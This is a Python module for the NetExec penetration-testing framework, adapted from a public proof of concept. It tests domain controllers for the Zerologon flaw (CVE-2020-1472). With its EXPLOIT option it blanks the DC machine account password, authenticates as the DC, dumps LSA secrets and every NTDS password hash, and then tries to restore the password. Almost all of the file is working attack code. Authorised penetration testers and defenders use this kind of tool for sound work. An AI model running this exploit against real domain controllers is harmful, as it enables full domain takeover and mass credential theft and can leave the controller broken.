# everything is comming from https://github.com/dirkjanm/CVE-2020-1472
# credit to @dirkjanm
# module by : @mpgn_x64
import os
import sys
from binascii import unhexlify
from struct import pack, unpack

from impacket.dcerpc.v5 import nrpc, epm, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.examples.secretsdump import RemoteOperations, LSASecrets, NTDSHashes
from impacket.smbconnection import SMBConnection

from nxc.helpers.misc import CATEGORY
from nxc.helpers.rpc import NXCRPCConnection
from nxc.logger import nxc_logger

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be necessary on average.
MAX_ATTEMPTS = 2000  # False negative chance: 0.04%


class NXCModule:
    name = "zerologon"
    description = "Check if the DC is vulnerable to Zerologon (CVE-2020-1472); with EXPLOIT=True, dump the NTDS then restore the DC password (DESTRUCTIVE)"
    supported_protocols = ["smb", "wmi"]
    category = CATEGORY.ENUMERATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options

    def options(self, context, module_options):
        """EXPLOIT   When vulnerable: empty the DC machine account password, dump the NTDS as DC$, then restore the original password (DESTRUCTIVE). Default: False"""
        self.exploit = module_options.get("EXPLOIT", "").lower() in ("true", "1", "yes")

    def on_login(self, context, connection):
        self.context = context
        if self.perform_attack(connection, "\\\\" + connection.hostname, connection.host, connection.hostname, connection.host):
            self.context.log.highlight("VULNERABLE")
            self.context.log.highlight("Next step: https://github.com/dirkjanm/CVE-2020-1472")
            try:
                host = self.context.db.get_hosts(connection.host)[0]
                self.context.db.add_host(
                    host.ip,
                    host.hostname,
                    host.domain,
                    host.os,
                    host.smbv1,
                    host.signing,
                    zerologon=True,
                )
            except Exception:
                self.context.log.debug("Error updating zerologon status in database")

    def perform_attack(self, connection, dc_handle, dc_ip, target_computer, remoteHost):
        # Keep authenticating until successful. Expected average number of attempts needed: 256.
        self.context.log.debug("Performing authentication attempts...")
        rpc_con = None
        try:
            binding = epm.hept_map(remoteHost, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
            string_binding = binding.replace(remoteHost, dc_ip)
            rpc_con = NXCRPCConnection(connection).connect(
                None,
                nrpc.MSRPC_UUID_NRPC,
                string_binding=string_binding,
                set_remote_host=remoteHost,
                anonymous_rpc=True,
            )
            for _attempt in range(MAX_ATTEMPTS):
                result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)
                if result:
                    if self.exploit:
                        self.run_exploit(connection, rpc_con, dc_handle, dc_ip, target_computer, remoteHost)
                    return True
            else:
                self.context.log.highlight("Attack failed. Target is probably patched.")
        except DCERPCException:
            self.context.log.fail("Error while connecting to host: DCERPCException, which means this is probably not a DC!")

    def run_exploit(self, connection, rpc_con, dc_handle, dc_ip, target_computer, remoteHost):
        """Exploit (empty the DC$ password), dump LSA+NTDS as DC$, then always restore the original password."""
        self.context.log.highlight("EXPLOIT: resetting the DC machine account password to an empty string (DESTRUCTIVE)")
        if not self.set_empty_password(rpc_con, dc_handle, target_computer):
            return
        self.context.log.success(f"{target_computer}$ password is now empty")

        original_password = None
        try:
            original_password = self.loot(connection, dc_ip, target_computer, remoteHost)
        finally:
            if original_password:
                self.restore_password(dc_ip, target_computer, remoteHost, original_password)
            else:
                self.context.log.fail(f"Could not recover the original password of {target_computer}$: the DC is BROKEN until you restore it manually (https://github.com/dirkjanm/CVE-2020-1472, restorepassword.py)")

    def set_empty_password(self, rpc_con, dc_handle, target_computer):
        request = nrpc.NetrServerPasswordSet2()
        request["PrimaryName"] = dc_handle + "\x00"
        request["AccountName"] = target_computer + "$\x00"
        request["SecureChannelType"] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator["Credential"] = b"\x00" * 8
        authenticator["Timestamp"] = 0
        request["Authenticator"] = authenticator
        request["ComputerName"] = target_computer + "\x00"
        request["ClearNewPassword"] = b"\x00" * 516
        try:
            result = rpc_con.request(request)
        except nrpc.DCERPCSessionError as e:
            self.context.log.fail(f"Exploit failed: {e}")
            return False
        if result["ErrorCode"] != 0:
            self.context.log.fail(f"Exploit returned non-zero code: {result['ErrorCode']}")
            return False
        return True

    def loot(self, connection, dc_ip, target_computer, remoteHost):
        """Authenticate as DC$ with the now-empty hash, recover the original machine password from LSA, and dump the NTDS."""
        original_password = None
        smb = SMBConnection(remoteHost, dc_ip)
        smb.login(f"{target_computer}$", "", connection.domain, nthash="31d6cfe0d16ae931b73c59d7e0c089c0")
        remote_ops = RemoteOperations(smb, False, connection.kdcHost)
        remote_ops.enableRegistry()
        bootkey = remote_ops.getBootKey()
        try:
            captured = {}

            def lsa_callback(secret):
                if secret.startswith("$MACHINE.ACC") and "plain_password_hex:" in secret:
                    captured["pw"] = unhexlify(secret.split("plain_password_hex:")[1])

            security_file = remote_ops.saveSECURITY()
            LSASecrets(security_file, bootkey, remote_ops, isRemote=True, perSecretCallback=lambda secret_type, secret: lsa_callback(secret)).dumpSecrets()
            original_password = captured.get("pw")

            output_filename = connection.output_file_template.format(output_folder="ntds")
            os.makedirs(os.path.dirname(output_filename), exist_ok=True)
            self.context.log.display("Dumping the NTDS over DRSUAPI...")
            NTDSHashes(None, bootkey, isRemote=True, noLMHash=True, remoteOps=remote_ops, useVSSMethod=False, justNTLM=True, pwdLastSet=False, resumeSession=None, outputFileName=output_filename, printUserStatus=False, perSecretCallback=lambda secret_type, secret: self.context.log.highlight(secret)).dump()
            self.context.log.success(f"Dumped NTDS to {output_filename}.ntds")
        finally:
            try:
                remote_ops.finish()
            except Exception as e:
                self.context.log.debug(f"RemoteOperations cleanup returned: {e}")
            try:
                smb.close()
            except Exception as e:
                self.context.log.debug(f"SMB cleanup returned: {e}")
        return original_password

    def restore_password(self, dc_ip, target_computer, remoteHost, password):
        """Set the DC machine account password back to its original value over a legitimate (now empty) secure channel."""
        binding = epm.hept_map(remoteHost, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
        dce = transport.DCERPCTransportFactory(binding.replace(remoteHost, dc_ip)).get_dce_rpc()
        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)

        server_challenge = nrpc.hNetrServerReqChallenge(dce, NULL, target_computer + "\x00", b"12345678")["ServerChallenge"]
        session_key = nrpc.ComputeSessionKeyAES("", b"12345678", server_challenge)
        client_credential = nrpc.ComputeNetlogonCredentialAES(b"12345678", session_key)
        try:
            nrpc.hNetrServerAuthenticate3(dce, "\\\\" + target_computer + "\x00", target_computer + "$\x00", nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, target_computer + "\x00", client_credential, 0x212FFFFF)
        except Exception as e:
            if "STATUS_DOWNGRADE_DETECTED" not in str(e):
                self.context.log.fail(f"Restore failed to authenticate: {e}; restore manually (restorepassword.py)")
                return

        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator["Credential"] = nrpc.ComputeNetlogonCredentialAES(pack("<Q", unpack("<Q", client_credential)[0] + 10), session_key)
        authenticator["Timestamp"] = 10
        request = nrpc.NetrServerPasswordSet2()
        request["PrimaryName"] = "\\\\" + target_computer + "\x00"
        request["AccountName"] = target_computer + "$\x00"
        request["SecureChannelType"] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        request["Authenticator"] = authenticator
        request["ComputerName"] = target_computer + "\x00"
        indata = b"\x00" * (512 - len(password)) + password + pack("<L", len(password))
        request["ClearNewPassword"] = nrpc.ComputeNetlogonCredentialAES(indata, session_key)
        try:
            dce.request(request)
        except nrpc.DCERPCSessionError as e:
            self.context.log.fail(f"Restore failed: {e}; restore manually (restorepassword.py)")
            return
        self.context.log.success(f"Restored the original password of {target_computer}$ — DC is back to normal")


def fail(msg):
    nxc_logger.debug(msg)
    nxc_logger.fail("This might have been caused by invalid arguments or network issues.")
    sys.exit(2)


def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
    # Connect to the DC's Netlogon service.

    # Use an all-zero challenge and credential.
    plaintext = b"\x00" * 8
    ciphertext = b"\x00" * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212FFFFF

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + "\x00", target_computer + "\x00", plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con,
            dc_handle + "\x00",
            target_computer + "$\x00",
            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            target_computer + "\x00",
            ciphertext,
            flags,
        )

        # It worked!
        assert server_auth["ErrorCode"] == 0
        return True

    except nrpc.DCERPCSessionError as ex:
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xC0000022:
            return None
        else:
            fail(f"Unexpected error code from DC: {ex.get_error_code()}.")
    except BaseException as ex:
        fail(f"Unexpected error: {ex}.")
